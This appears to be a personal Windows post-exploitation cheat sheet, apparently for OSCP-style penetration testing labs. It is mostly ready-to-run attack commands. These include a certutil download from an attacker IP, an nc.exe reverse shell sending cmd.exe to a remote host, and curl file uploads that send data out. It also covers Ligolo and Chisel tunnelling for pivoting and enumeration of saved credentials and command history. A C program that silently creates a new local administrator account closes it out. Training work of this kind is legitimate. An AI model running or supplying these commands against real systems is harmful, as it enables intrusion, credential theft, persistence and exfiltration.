## Post exploitation

- Download scripts
```
certutil.exe -urlcache -split -f http://192.168.45.241/script.zip C:/Users/Public/script.zip
```
- Unzip scripts
```
tar -xf script.zip
```

- Spawn more shells
```
start /B nc.exe 192.168.45.225 4545 -e cmd.exe
```
- WinPEAS
```
winPEASx64.exe > output.txt
```
- Transfer files
```
python3 -m pip install uploadserver
python3 -m uploadserver 80
```

```cmd
curl.exe -X POST 192.168.45.191:8000/upload  -F "files=@filename"
```
## Tunneling 
### Ligolo
- Server
```
sudo ligolo-proxy -selfcert
```
- Agents on release tab [links](https://github.com/nicocha30/ligolo-ng/tree/v0.9.1) 
```
.\agent.exe -connect KALI_IP:11601 -ignore-cert
```
- After agent joined `session` --> select the session --> `interface_create --name ligolo` --> `start` --> `route_add --name ligolo --route 10.10.162.0/24`
- For loopback interface `interface_add_route --name ligolo --route 240.0.0.1/32`
### Chisel
```s
chisel.exe client KALI_IP:8080 R:socks
```
```
chisel server --reverse --port 8080
```
```
 sudo proxychains nmap -sT -Pn -p 3306,1337 127.0.0.1
```
```
sudo proxychains nmap -sT -Pn 10.10.167.142 --top-ports 1000 -T5 -oN 142.internal
```

## Enumerations
- Basic information
```cmd
whoami /all
net user
cmdkey /list
net group
powershell -command "type (Get-PSReadlineOption).HistorySavePath"
systeminfo
netstat -ano
powershell -Command "Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"
powershell -Command "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"
powershell -Command "Get-Process"
```
- run [PrivescCheck](https://github.com/itm4n/PrivescCheck)
- Check unusual user files and C:/ files
- WinPEAS 
- [Privileges and escalation](https://github.com/gtworek/Priv2Admin)
### Binary hijacking
- Add user
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user bosa password123! /add");
  i = system ("net localgroup administrators bosa /add");
  
  return 0;
}

```
- compile
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

## General commands

- Permissions
```
icacls C:\Folder
```
- process kill
```
# kill by name
taskkill /F /IM nc.exe

# or find PID first
tasklist | findstr nc.exe

# then kill by PID
taskkill /F /PID 1234
```
- Rename file
```
ren oldname.txt newname.txt
```
- List all files (including hidden)
```
dir /a
```
- for recursively
```
dir /s /a
```
- Find binary path
```
where notepad
```
- List only .txt and .ps1 files
```
dir *.txt *.ps1
```


## Payloads
- [MSFVenom](https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86) for OSCP
- Staged payload - `shell/reverse_tcp`
- Stageless payload - `shell_reverse_tcp`
### Privileges
General list 
https://github.com/gtworek/Priv2Admin
